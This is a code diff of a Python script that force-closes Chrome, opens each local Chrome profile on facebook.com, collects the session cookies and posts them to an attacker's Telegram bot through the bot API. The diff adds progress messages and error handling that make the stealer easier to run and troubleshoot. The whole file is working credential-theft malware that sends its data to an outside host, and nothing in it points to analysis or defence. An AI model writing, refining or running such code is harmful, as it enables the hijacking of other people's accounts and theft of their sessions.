@@ -16,13 +16,21 @@ TELEGRAM_API = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'
 
 def install_libraries():
     required_libs = ["requests", "webdriver_manager", "selenium"]
-    subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    for lib in required_libs:
-        if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
-            subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        print("Ensuring pip is installed...")
+        subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("Upgrading pip...")
+        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for lib in required_libs:
+            if subprocess.run([sys.executable, "-c", "import " + lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode != 0:
+                print(f"Installing {lib}...")
+                subprocess.run([sys.executable, "-m", "pip", "install", lib], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error installing libraries: {e}")
+        sys.exit(1)
 
 def close_chrome():
+    print("Closing Chrome processes...")
     subprocess.run("taskkill /F /IM chrome.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def check_chrome_installed():
@@ -31,7 +39,10 @@ def check_chrome_installed():
         os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Google", "Chrome", "Application", "chrome.exe"),
         os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\" + os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
     ]
-    return any(os.path.exists(path) for path in possible_paths)
+    if not any(os.path.exists(path) for path in possible_paths):
+        print("Error: Chrome is not installed.")
+        sys.exit(1)
+    return True
 
 def get_cookies_from_profile(profile_name):
     options = Options()
@@ -44,6 +55,7 @@ def get_cookies_from_profile(profile_name):
     options.add_argument("profile-directory=" + profile_name)
 
     try:
+        print(f"Getting cookies from profile {profile_name}...")
         driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
         driver.get('https://www.facebook.com/')
         WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
@@ -59,9 +71,18 @@ def cookies_to_header_string(cookies):
 
 def send_telegram(profile_cookies):
     message = "\n\n".join(f"Profile: {p}\n{cookies_to_header_string(c)}" for p, c in profile_cookies.items()) or "Không lấy được cookies!"
-    requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
+    try:
+        print("Sending cookies to Telegram...")
+        response = requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message}, timeout=5)
+        if response.status_code != 200:
+            print(f"Error sending Telegram message: {response.text}")
+        else:
+            print("Cookies sent to Telegram successfully.")
+    except Exception as e:
+        print(f"Error sending Telegram message: {e}")
 
 if __name__ == "__main__":
+    print("Starting script...")
     install_libraries()
     if not check_chrome_installed():
         sys.exit(1)
@@ -77,3 +98,4 @@ if __name__ == "__main__":
             profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
+    print("Script completed.")
